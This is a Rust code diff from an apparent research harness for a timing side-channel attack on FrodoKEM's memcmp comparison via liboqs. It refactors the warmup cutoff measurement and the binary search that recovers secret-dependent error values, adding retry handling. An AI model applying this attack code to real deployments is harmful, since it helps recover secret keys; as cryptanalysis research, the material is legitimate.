@@ -1,10 +1,9 @@
 use super::modify_and_measure::*;
-use crate::attack::memcmp_frodo::profile::profile;
-use crate::attack::memcmp_frodo::profile::Profile;
 use crate::attack::memcmp_frodo::MeasureSource;
 use crate::utils::save_to_csv;
 use crate::utils::Rec;
 use crate::utils::Recorder;
+use crate::utils::SaveAllRecorder;
 use liboqs_rs_bindings as oqs;
 use log::{debug, error, info, trace, warn};
 use log_derive::logfn_inputs;
@@ -13,25 +12,38 @@ use oqs::frodokem::KemBuf;
 use std::convert::TryInto;
 use std::path::PathBuf;
 
+enum SearchError {
+    Internal(String),
+    Retry,
+}
+
+impl<S: ToString> From<S> for SearchError {
+    fn from(s: S) -> SearchError {
+        SearchError::Internal(s.to_string())
+    }
+}
+
 #[logfn_inputs(Trace)]
 fn search_modification<FRODO: FrodoKem>(
     index_ij: usize,
     iterations: u64,
+    profileiters: u64,
     measure_source: &MeasureSource,
-    profile: Profile,
+    cutoff: u64,
     ciphertext: &mut FRODO::Ciphertext,
     shared_secret_d: &mut FRODO::SharedSecret,
     secret_key: &mut FRODO::SecretKey,
     expected_x0: u16,
     save_to_file: Option<&PathBuf>,
-) -> Result<u16, String> {
+    recorders: &mut Vec<Recorder<SaveAllRecorder>>,
+) -> Result<u16, SearchError> {
     let maxmod = error_correction_limit::<FRODO>() * 2;
     let mut high = maxmod + 2; // This ensures that we try maxmod-1 first
     let mut low = maxmod - 3; // This ensures that we try maxmod-1 first
     let mut highmodtime = None;
     let mut threshold = None;
+    let mut iters = profileiters;
     let found = loop {
-        let profile = profile.clone();
         let currentmod: u16 = ((high + low) / 2).try_into().map_err(|_| "overflow")?;
         trace!("high: {}, low: {}", high, low);
         debug!(
@@ -40,24 +52,26 @@ fn search_modification<FRODO: FrodoKem>(
             FRODO::C::len() - 1,
             currentmod,
             index_ij,
-            iterations
+            iters
         );
         let rec = mod_measure::<FRODO, _>(
             currentmod,
             index_ij,
-            iterations,
+            iters,
             &measure_source,
             ciphertext,
             shared_secret_d,
             secret_key,
             Recorder::saveall(
                 format!("BINSEARCH[{}]({}){{{}}}", index_ij, expected_x0, currentmod),
-                Some(profile.cutoff),
+                Some(cutoff),
             ),
         )?;
-        let time = rec.aggregated_value()?;
+        let time = rec.aggregated_value().map_err(|err| {
+            error!("{}", err);
+            SearchError::Retry
+        })?;
         if let Some(path) = save_to_file {
-            let mut recorders = profile.recorders.borrow_mut();
             recorders.push(rec);
             debug!("Saving measurments to file {:?}", path);
             save_to_csv(&path, &recorders)?;
@@ -94,17 +108,15 @@ fn search_modification<FRODO: FrodoKem>(
                     "threshold high ({}) <= threshold low ({})",
                     time, threshold_low
                 );
-                return Err(
-                    "Could not make a good profile, try again with a higher iteration count!"
-                        .to_string(),
-                );
+                return Err(SearchError::Retry);
             }
 
             let diff = time - threshold_low;
             threshold.replace(threshold_low + (diff / 2));
-            info!("New threshold is: {:?}", threshold);
+            info!("New threshold is: {:?} (diff: {})", threshold, diff);
             high = maxmod;
             low = 0;
+            iters = iterations;
         } else {
             info!(
                 "C[{}/{}] => Mean of high amount of modifications: {}",
@@ -122,15 +134,17 @@ fn search_modification<FRODO: FrodoKem>(
     };
     if high == maxmod {
         warn!("Upper bound never changed, we might have missed the real threshold modification!");
+        return Err(SearchError::Retry);
     }
     if low == 0 {
         warn!("Lower bound never changed, we might have missed the real threshold modification!");
+        return Err(SearchError::Retry);
     }
 
     Ok(found as u16)
 }
 
-#[logfn_inputs(Trace)]
+//#[logfn_inputs(Trace)]
 pub fn crack_s<FRODO: FrodoKem>(
     warmup: u64,
     iterations: u64,
@@ -143,6 +157,7 @@ pub fn crack_s<FRODO: FrodoKem>(
         "Launching the crack_s routine against {} MEMCMP vulnerability.",
         FRODO::name()
     );
+
     let mut public_key = FRODO::PublicKey::new();
     let mut secret_key = FRODO::SecretKey::new();
     let mut ciphertext = FRODO::Ciphertext::new();
@@ -160,6 +175,10 @@ pub fn crack_s<FRODO: FrodoKem>(
     let nbr_encaps = 1;
     let i = mbar - 1;
 
+    let mut recorders = vec![];
+
+    measure_source.prep_thread()?;
+
     for t in 0..nbr_encaps {
         info!("Using encaps to generate ciphertext number: {}", t);
         FRODO::encaps(&mut ciphertext, &mut shared_secret_e, &mut public_key)?;
@@ -169,34 +188,57 @@ pub fn crack_s<FRODO: FrodoKem>(
         for j in 0..nbar {
             // Modify ciphertext at C[nbar-1, j]
             let index = i * nbar + j;
-
-            let profile = profile::<FRODO>(
-                index,
-                warmup,
-                profileiters,
-                measure_source,
-                &mut secret_key,
-                &mut ciphertext,
-                save_to_file.as_ref(),
-            )?;
-
             let expected_x0 = (err_corr_limit - expectedEppp[index]) as u16;
 
-            info!(
-                "Starting binary search for Eppp[{},{}], expect to find x0 = {}",
-                i, j, expected_x0
-            );
-            let x0 = search_modification::<FRODO>(
-                index,
-                iterations,
-                &measure_source,
-                profile.clone(),
-                &mut ciphertext,
-                &mut shared_secret_d,
-                &mut secret_key,
-                expected_x0,
-                save_to_file.as_ref(),
-            )?;
+            let x0 = loop {
+                info!(
+                    "Starting {} warmup iterations without modifications in order to detect a good cutoff value", warmup
+                );
+                let cutoff = {
+                    let rec = mod_measure::<FRODO, _>(
+                        0,
+                        index,
+                        warmup,
+                        &measure_source,
+                        &mut ciphertext,
+                        &mut shared_secret_d,
+                        &mut secret_key,
+                        Recorder::saveall("WARMUP", None),
+                    )?;
+                    let mean = rec.aggregated_value()?;
+                    let minimum_value = rec.min()?;
+                    let cutoff = mean + (mean - minimum_value);
+                    info!(
+                    "PROFILING ==> using {} as the cutoff value to remove outliers (minimum warmup latency: {}, mean: {}).",
+                    cutoff, minimum_value, mean
+                );
+                    cutoff
+                };
+
+                info!(
+                    "Starting binary search for Eppp[{},{}], expect to find x0 = {}",
+                    i, j, expected_x0
+                );
+                match search_modification::<FRODO>(
+                    index,
+                    iterations,
+                    profileiters,
+                    &measure_source,
+                    cutoff,
+                    &mut ciphertext,
+                    &mut shared_secret_d,
+                    &mut secret_key,
+                    expected_x0,
+                    save_to_file.as_ref(),
+                    &mut recorders,
+                ) {
+                    Ok(x0) => break x0,
+                    Err(SearchError::Retry) => {
+                        warn!("Retrying the search since we didn't get any results.");
+                    }
+                    Err(SearchError::Internal(err)) => return Err(err),
+                }
+            };
 
             let Eppp_ij = err_corr_limit - x0;
             if Eppp_ij - 1 != expectedEppp[index] {
